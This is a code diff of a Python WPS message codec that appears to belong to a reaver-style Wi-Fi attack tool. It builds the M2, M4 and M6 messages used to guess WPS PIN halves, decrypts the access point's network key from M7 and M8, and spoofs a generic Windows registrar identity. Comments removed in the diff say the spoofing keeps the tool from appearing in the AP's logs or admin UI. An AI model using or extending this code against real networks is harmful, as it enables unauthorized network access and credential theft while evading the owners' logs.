@@ -1,8 +1,7 @@
 """WSC message codec + EAP/EAPOL/WFA wire framing.
 
 Builds the registrar-side messages (M2/M4/M6/WSC_NACK) and parses the
-enrollee-side ones (identity request, M1/M3/M5/M7, NACK, EAP-FAIL) the way
-reaver/bully/hostapd put them on the wire.
+enrollee-side ones (identity request, M1/M3/M5/M7, NACK, EAP-FAIL).
 
 Framing (reaver ``src/builder.c``; struct layouts ``defs.h``):
 
@@ -22,6 +21,7 @@ from __future__ import annotations
 
 import os
 import struct
+from collections.abc import Iterator
 from dataclasses import dataclass, field
 from typing import Dict, Optional
 
@@ -93,6 +93,8 @@ WSC_NACK = 0x03
 WSC_MSG = 0x04
 WSC_DONE = 0x05
 WSC_FRAG_ACK = 0x06
+WSC_FLAG_MORE_FRAGMENTS = 0x01
+WSC_FLAG_LENGTH_FIELD = 0x02
 
 # Device Password ID
 DEV_PW_DEFAULT = 0x0000
@@ -119,12 +121,7 @@ REGISTRAR_IDENTITY = b"WFA-SimpleConfig-Registrar-1-0"
 ENROLLEE_IDENTITY = b"WFA-SimpleConfig-Enrollee-1-0"
 
 # ---- Registrar device descriptor -------------------------------------------
-# These TLVs are cosmetic to the protocol (APs don't validate them) but they
-# ARE visible to the AP and surface in its WPS logs / admin UI as "the device
-# that paired". So they MUST NOT fingerprint the tool. We impersonate a generic
-# Windows registrar (Manufacturer "Microsoft" / Model "Windows", a Computer/PC
-# primary device type), exactly the blend reaver uses, because a Windows machine
-# doing WPS is the most ordinary thing on the air. NEVER advertise "wifit3" here.
+# We impersonate a generic Windows registrar (similar to reaver)
 _MANUFACTURER = b"Microsoft"
 _MODEL_NAME = b"Windows"
 _MODEL_NUMBER = b"10.0"
@@ -154,18 +151,21 @@ def tlv_u16(attr_id: int, value: int) -> bytes:
     return tlv(attr_id, struct.pack(">H", value & 0xFFFF))
 
 
-def parse_tlvs(data: bytes) -> Dict[int, bytes]:
-    """Walk WSC TLVs into {attr_id: value}. Repeated attrs keep the last."""
-    out: Dict[int, bytes] = {}
-    i, n = 0, len(data)
+def iter_wsc_tlvs(data: bytes, start: int = 0) -> Iterator[tuple[int, bytes]]:
+    """Walk WSC Big-Endian TLVs (2B attr, 2B len), yielding (attr_id, value)."""
+    i, n = start, len(data)
     while i + 4 <= n:
-        attr, ln = struct.unpack(">HH", data[i : i + 4])
+        attr, ln = struct.unpack_from(">HH", data, i)
         i += 4
         if i + ln > n:
             break
-        out[attr] = data[i : i + ln]
+        yield attr, data[i : i + ln]
         i += ln
-    return out
+
+
+def parse_tlvs(data: bytes) -> Dict[int, bytes]:
+    """Walk WSC TLVs into {attr_id: value}. Repeated attrs keep the last."""
+    return dict(iter_wsc_tlvs(data))
 
 
 def _device_attrs() -> bytes:
@@ -186,14 +186,8 @@ def _version_and_type(msg_type: int) -> bytes:
     return tlv_u8(ATTR_VERSION, WPS_VERSION) + tlv_u8(ATTR_MSG_TYPE, msg_type)
 
 
-def build_m2(
-    nonce_e: bytes,
-    nonce_r: bytes,
-    uuid_r: bytes,
-    pkr: bytes,
-    authkey: bytes,
-    m1_attrs: bytes,
-    dev_pw_id: int = 0x0000,
+def build_m2(nonce_e: bytes, nonce_r: bytes, uuid_r: bytes, pkr: bytes,
+    authkey: bytes, m1_attrs: bytes, dev_pw_id: int = 0x0000,
 ) -> bytes:
     """M2 (hostapd ``wps_build_m2`` attribute order). Authenticator over M1||M2*."""
     body = (
@@ -225,26 +219,11 @@ def _encr_settings(authkey: bytes, keywrapkey: bytes, inner: bytes) -> bytes:
     return iv + wc.aes128_cbc_encrypt(keywrapkey, iv, plain)
 
 
-def build_m4(
-    nonce_e: bytes,
-    r_s1: bytes,
-    r_s2: bytes,
-    psk1: bytes,
-    psk2: bytes,
-    pke: bytes,
-    pkr: bytes,
-    authkey: bytes,
-    keywrapkey: bytes,
-    m3_attrs: bytes,
+def build_m4(nonce_e: bytes, r_s1: bytes, r_s2: bytes, psk1: bytes, psk2: bytes,
+    pke: bytes, pkr: bytes, authkey: bytes, keywrapkey: bytes, m3_attrs: bytes,
 ) -> bytes:
     """M4: commits R-Hash1=H(R-S1||PSK1||..), R-Hash2=H(R-S2||PSK2||..) and
-    reveals R-S1 in the Encrypted Settings. Authenticator over M3||M4*.
-
-    The enrollee decrypts R-S1 and recomputes R-Hash1 with ITS real PSK1; if our
-    guessed first-half PSK1 matches, it proceeds to M5, else NACK: that M5-vs-NACK
-    reply decides the first half. ``r_s2`` here MUST be the same nonce
-    later revealed in M6 (R-Hash2 commits to it).
-    """
+    reveals R-S1 in the Encrypted Settings. Authenticator over M3||M4*."""
     r_hash1 = wc.e_or_r_hash(authkey, r_s1, psk1, pke, pkr)
     r_hash2 = wc.e_or_r_hash(authkey, r_s2, psk2, pke, pkr)
     body = (
@@ -258,13 +237,7 @@ def build_m4(
     return body + tlv(ATTR_AUTHENTICATOR, auth)
 
 
-def build_m6(
-    nonce_e: bytes,
-    r_s2: bytes,
-    authkey: bytes,
-    keywrapkey: bytes,
-    m5_attrs: bytes,
-) -> bytes:
+def build_m6(nonce_e: bytes, r_s2: bytes, authkey: bytes, keywrapkey: bytes, m5_attrs: bytes) -> bytes:
     """M6: ENC{R-S2}. Authenticator over M5||M6*."""
     body = (
         _version_and_type(WPS_M6)
@@ -337,8 +310,7 @@ def build_m5_enrollee(nonce_r: bytes, e_s1: bytes, authkey: bytes,
 
 def build_m7_enrollee(nonce_r: bytes, e_s2: bytes, authkey: bytes,
                       keywrapkey: bytes, m6_attrs: bytes) -> bytes:
-    """M7: reveal E-S2 (encrypted). Authenticator over M6||M7. (Enrollee receiving
-    config sends no AP settings here.)"""
+    """M7: reveal E-S2 (encrypted). Authenticator over M6||M7."""
     body = (
         _version_and_type(WPS_M7)
         + tlv(ATTR_REGISTRAR_NONCE, nonce_r)
@@ -358,11 +330,7 @@ def build_wsc_done(nonce_e: bytes, nonce_r: bytes) -> bytes:
 def extract_m8_credentials(
     encr_settings_value: bytes, keywrapkey: bytes
 ) -> Optional[Dict[str, bytes]]:
-    """Decrypt M8's Encrypted Settings → the AP's Credential → {ssid, network_key}.
-
-    Unlike M7-to-a-registrar (flat AP settings), M8 wraps the config in a nested
-    ``ATTR_CRED`` TLV blob whose sub-TLVs hold SSID + Network Key (the PSK).
-    """
+    """Decrypt M8's Encrypted Settings → the AP's Credential → {ssid, network_key}."""
     if len(encr_settings_value) < 32 or len(encr_settings_value) % 16:
         return None
     iv, ct = encr_settings_value[:16], encr_settings_value[16:]
@@ -402,7 +370,7 @@ def eap_wsc_response(eap_id: int, opcode: int, wsc_attrs: bytes) -> bytes:
         bytes([EAP_TYPE_EXPANDED])
         + WFA_VENDOR_ID
         + WFA_VENDOR_TYPE_SIMPLECONFIG
-        + bytes([opcode, 0x00])                       # op-code, flags (no fragmentation)
+        + bytes([opcode, 0x00])   # op-code, flags (no fragmentation)
         + wsc_attrs
     )
     return _eapol_eap(EAP_RESPONSE, eap_id, expanded)
@@ -413,7 +381,7 @@ def eap_wsc_response(eap_id: int, opcode: int, wsc_attrs: bytes) -> bytes:
 # ---------------------------------------------------------------------------
 def build_data_frame(bssid: bytes, src: bytes, dst: bytes, payload_1x: bytes) -> bytes:
     """A non-QoS data frame (ToDS) carrying an 802.1X payload to the AP."""
-    fc = b"\x08\x01"                                  # data, ToDS=1
+    fc = b"\x08\x01"  # data, ToDS=1
     hdr = fc + b"\x00\x00" + bssid + src + dst + b"\x00\x00"   # Addr1=BSSID, Addr2=SA, Addr3=DA, seq
     return hdr + _LLC_SNAP_EAPOL + payload_1x
 
@@ -460,9 +428,6 @@ def parse_rx_frame(frame: bytes) -> Optional[ParsedEap]:
         return ParsedEap(eap_code=code, eap_id=eap_id, is_eap_failure=(code == EAP_FAILURE))
     if e + 5 > len(frame):
         return ParsedEap(eap_code=code, eap_id=eap_id)
-    # WSC is parsed for Requests (AP→us, the live path) AND Responses (so the
-    # in-process fake enrollee can read our M2/M4/M6). The live RX adapter
-    # filters to source==BSSID so we never act on our own echoed TX.
     eap_type = frame[e + 4]
     if eap_type == EAP_TYPE_IDENTITY:
         return ParsedEap(eap_code=code, eap_id=eap_id, eap_type=eap_type,
@@ -471,21 +436,18 @@ def parse_rx_frame(frame: bytes) -> Optional[ParsedEap]:
         return ParsedEap(eap_code=code, eap_id=eap_id, eap_type=eap_type)
     # Expanded: type(1) vendor-id(3) vendor-type(4) opcode(1) flags(1) attrs…
     exp = e + 5
-    if exp + 8 > len(frame):
+    if exp + 9 > len(frame):
         return None
     vendor_id = frame[exp : exp + 3]
     vendor_type = frame[exp + 3 : exp + 7]
     opcode = frame[exp + 7]
+    flags = frame[exp + 8]
     if vendor_id != WFA_VENDOR_ID or vendor_type != WFA_VENDOR_TYPE_SIMPLECONFIG:
         return None
     attrs_start = exp + 9                              # skip opcode + flags
-    # Bound the WSC message by the EAP length field, NOT the end of the frame.
-    # The EAP length is authoritative for what the AP signed into the next
-    # Authenticator HMAC (HMAC(authkey, M_prev ‖ M_curr) covers the raw WSC
-    # bytes). Trusting frame end instead would let any trailing junk
-    # (chip-side padding, future hardware metadata) poison the HMAC; the EAP
-    # packet spans [e, e+eap_len), so we slice there.
-    attrs_end = e + eap_len
+    if flags & WSC_FLAG_LENGTH_FIELD:
+        attrs_start += 2
+    attrs_end = e + eap_len  # Bound the WSC message by the EAP length field.
     if not (attrs_start <= attrs_end <= len(frame)):
         attrs_end = len(frame)
     raw_attrs = frame[attrs_start:attrs_end]
@@ -502,8 +464,7 @@ def extract_m7_credentials(
 ) -> Optional[Dict[str, bytes]]:
     """Decrypt M7's Encrypted Settings (AP's config) → flat AP-settings TLVs.
 
-    Returns {ssid, network_key, ...} or None if decryption is malformed.
-    The Network Key is the WPA passphrase/PSK: the prize.
+    Returns {ssid, network_key, mac_addr} or None if decryption is malformed.
     """
     if len(encr_settings_value) < 32 or len(encr_settings_value) % 16:
         return None
